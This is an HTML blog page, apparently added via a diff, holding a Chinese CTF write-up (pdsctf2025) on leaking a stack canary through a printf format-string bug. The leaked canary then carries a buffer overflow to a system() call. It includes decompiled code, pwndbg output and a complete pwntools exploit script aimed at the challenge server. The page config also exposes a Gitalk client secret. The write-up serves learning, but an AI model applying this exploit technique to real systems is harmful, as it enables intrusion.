@@ -1,0 +1,226 @@
+
+<!DOCTYPE html>
+<html lang="zh" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2026-4-13-Canary - 二月の档案室</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="二月, 博客, 技术, 分享, 记录, 学习, 分享, 记录, 档案室, 技术分享,  february, blog, technology, share, record, learn, share, record, archive, technology share,"> 
+    <meta name="description" content="所感所想，所言所行，我将以文字记录我自己。,canary12345678910111213// main函数反汇编转伪cunsigned __int64 vuln_leak()&amp;#123;  char buf[72]; // [rsp+0h],"> 
+    <meta name="author" content="Allureluoli"> 
+    <link rel="alternative" href="atom.xml" title="二月の档案室" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="2026-4-13-Canary - 二月の档案室"/>
+    <meta name="twitter:description" content="所感所想，所言所行，我将以文字记录我自己。,canary12345678910111213// main函数反汇编转伪cunsigned __int64 vuln_leak()&amp;#123;  char buf[72]; // [rsp+0h],"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="二月の档案室"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="2026-4-13-Canary - 二月の档案室"/>
+    <meta property="og:description" content="所感所想，所言所行，我将以文字记录我自己。,canary12345678910111213// main函数反汇编转伪cunsigned __int64 vuln_leak()&amp;#123;  char buf[72]; // [rsp+0h],"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">二月の档案室</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://blog.curesky.site"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">2026-4-13-Canary</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">2026-4-13-Canary</h1>
+        <div class="stuff">
+            <span>四月 13, 2026</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/pdsctf2025/" rel="tag">pdsctf2025</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数反汇编转伪c</span></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln_leak</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">72</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please tell me your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x3F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402026);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到buf &#x3D; 72 也就是0x48</p>
+<p>这里的 <code>vuln_leak()</code> 负责用格式化字符串泄露 canary；真正的栈溢出发生在后面的 <code>payload</code> 输入函数中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; unsigned __int64 vuln_overflow()</span><br><span class="line">public vuln_overflow</span><br><span class="line">vuln_overflow proc near</span><br><span class="line"></span><br><span class="line">buf= byte ptr -50h</span><br><span class="line">var_8= qword ptr -8</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">endbr64</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 50h</span><br><span class="line">mov     rax, fs:28h</span><br><span class="line">mov     [rbp+var_8], rax</span><br><span class="line">xor     eax, eax</span><br><span class="line">mov     edi, offset aTellMeYourPayl ; &quot;tell me your payload:&quot;</span><br><span class="line">call    _puts</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, 100h       ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">call    _read</span><br><span class="line">mov     edi, offset asc_40203D ;</span><br><span class="line">call    _puts</span><br><span class="line">nop</span><br><span class="line">mov     rax, [rbp+var_8]</span><br><span class="line">sub     rax, fs:28h</span><br><span class="line">jz      short locret_4012D9</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln_overflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">72</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your payload:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(asc_40203D);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此题目的难点在于启用了canary</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(cure㉿LAPTOP-CMAM5D0J)-[~/CTF/pwn/18]</span><br><span class="line">└─$ /bin/checksec --file=pwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable      FILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   45 Symbols        No    0               2       pwn</span><br></pre></td></tr></table></figure>
+
+<p>要破解canary必须知道canary的基本原理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
+
+<p>转自 https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;mitigation&#x2F;canary&#x2F;</p>
+<p>首先代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please tell me your name:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x3F</span>uLL);</span><br><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure>
+
+<p>存在格式化字符串利用漏洞，我们可以依据此漏洞泄露栈上canary的值</p>
+<p>根据<strong>Linux x86_64 &#x2F; System V ABI</strong> 的规则。</p>
+<p>普通函数调用时，前 6 个整数&#x2F;指针参数放在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDI, RSI, RDX, RCX, R8, R9</span><br></pre></td></tr></table></figure>
+
+<p>第 7 个参数开始才放栈上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a1 -&gt; RDI</span><br><span class="line">a2 -&gt; RSI</span><br><span class="line">a3 -&gt; RDX</span><br><span class="line">a4 -&gt; RCX</span><br><span class="line">a5 -&gt; R8</span><br><span class="line">a6 -&gt; R9</span><br><span class="line">a7 -&gt; 栈</span><br><span class="line">a8 -&gt; 栈</span><br></pre></td></tr></table></figure>
+
+<p>所以我们要去寻找栈上的canary值，从<code>%6$p</code>开始找</p>
+<p>直接利用格式化字符串漏洞去泄露地址，先从 <code>%6$p</code> 左右开始枚举，再根据输出确认</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">Welcome to PDSCTF!!!</span><br><span class="line">Please tell me your name:</span><br><span class="line">%6<span class="variable">$p</span>|%7<span class="variable">$p</span>|%8<span class="variable">$p</span>|%9<span class="variable">$p</span>|%10<span class="variable">$p</span>|%11<span class="variable">$p</span>|%12<span class="variable">$p</span>|%13<span class="variable">$p</span>|%14<span class="variable">$p</span>|%15<span class="variable">$p</span>|%16<span class="variable">$p</span>|%17<span class="variable">$p</span>|%18<span class="variable">$p</span></span><br><span class="line">0x2437257c70243625|0x257c702438257c70|0x243031257c702439|0x7c70243131257c70|0x31257c7024323125|0x243431257c702433|0x7c70243531257c70|0x257c7024363125|0x7fffffffce80|0xbd5dae3ec69d5d00|0x7fffffffce80|%</span><br><span class="line">tell me your payload:</span><br></pre></td></tr></table></figure>
+
+<p>我们找到的 <code>0xbd5dae3ec69d5d00</code> 因为结尾是00 明显符合canary的格式</p>
+<p>然后我们去找一个合适的跳转落点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4011d6: endbr64</span><br><span class="line">4011da: push   %rbp</span><br><span class="line">4011db: mov    %rsp,%rbp</span><br><span class="line">4011de: sub    <span class="variable">$0x10</span>,%rsp</span><br><span class="line">4011f1: mov    <span class="variable">$0x402004</span>,%edi</span><br><span class="line">4011f6: call   4010c0 &lt;system@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>经过验证4011db和4011f1两个地址都可以用</p>
+<p>然后利用<code>ROPgadget</code>去找 <code>ret</code>的值，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(cure㉿LAPTOP-CMAM5D0J)-[~/CTF/pwn/18]</span><br><span class="line">└─$ ROPgadget --binary pwn --only <span class="string">&#x27;ret&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040101a : ret</span><br></pre></td></tr></table></figure>
+
+<p>至此，我们什么都不缺了</p>
+<p>构建exp脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">12034</span>)</span><br><span class="line">buf_addr = <span class="number">0x48</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">sh = <span class="number">0x4011f1</span></span><br><span class="line">pay = <span class="string">b&#x27;%15$p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27; name:&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak_data = p.recvline().strip()</span><br><span class="line">canary = <span class="built_in">int</span>(leak_data,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*buf_addr +p64(canary)+p64(ret)+p64(sh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;payload:\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://blog.curesky.site/audio/yinlang.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="true"
+        data-ci="10a7f71656553fd4676c"
+        data-cs="48f8d183288b4d0b2531f047719dee43bdc913ec"
+        data-r="allureluoli.github.io"
+        data-o="allureluoli"
+        data-a="allureluoli"
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#canary"><span class="toc-number">1.</span> <span class="toc-text">canary</span></a></li></ol>
+        </div>
+    
+</div>
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
